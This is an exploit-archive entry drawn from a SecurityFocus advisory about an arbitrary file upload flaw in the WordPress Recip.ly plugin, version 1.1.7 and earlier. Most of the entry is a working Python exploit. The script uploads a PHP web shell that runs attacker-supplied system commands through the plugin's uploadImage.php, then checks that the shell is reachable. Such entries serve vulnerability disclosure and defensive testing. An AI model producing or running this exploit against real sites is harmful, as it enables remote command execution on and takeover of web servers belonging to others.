source: http://www.securityfocus.com/bid/46002/info

WordPress Recip.ly is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the webserver process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

WordPress Recip.ly 1.1.7 and prior versions are vulnerable. 

import socket

host = &#039;localhost&#039;
path = &#039;/wordpress&#039;
shell_path = path + &#039;/wp-content/plugins/reciply/images/shell.php&#039;
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)    

    s.send(&#039;POST &#039; + path + &#039;/wp-content/plugins/reciply/uploadImage.php HTTP/1.1\r\n&#039;
           &#039;Host: localhost\r\n&#039;
           &#039;Proxy-Connection: keep-alive\r\n&#039;
           &#039;User-Agent: x\r\n&#039;
           &#039;Content-Length: 195\r\n&#039;
           &#039;Cache-Control: max-age=0\r\n&#039;
           &#039;Origin: null\r\n&#039;
           &#039;Content-Type: multipart/form-data; boundary=----x\r\n&#039;
           &#039;Accept: text/html\r\n&#039;
           &#039;Accept-Encoding: gzip,deflate,sdch\r\n&#039;
           &#039;Accept-Language: en-US,en;q=0.8\r\n&#039;
           &#039;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n&#039;
           &#039;\r\n&#039;
           &#039;------x\r\n&#039;
           &#039;Content-Disposition: form-data; name="shell_file"; filename="shell.php"\r\n&#039;
           &#039;Content-Type: application/octet-stream\r\n&#039;
           &#039;\r\n&#039;
           &#039;<?php echo \&#039;<pre>\&#039; + system($_GET[\&#039;CMD\&#039;]) + \&#039;</pre>\&#039;; ?>\r\n&#039;
           &#039;------x--\r\n&#039;
           &#039;\r\n&#039;)

    resp = s.recv(8192)

    http_ok = &#039;HTTP/1.1 200 OK&#039;
    
    if http_ok not in resp[:len(http_ok)]:
        print &#039;error uploading shell&#039;
        return
    else: print &#039;shell uploaded&#039;

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)  
    s.send(&#039;GET &#039; + shell_path + &#039; HTTP/1.1\r\n&#039;\
           &#039;Host: &#039; + host + &#039;\r\n\r\n&#039;)

    if http_ok not in s.recv(8192)[:len(http_ok)]: print &#039;shell not found&#039;        
    else: print &#039;shell located at http://&#039; + host + shell_path

upload_shell()
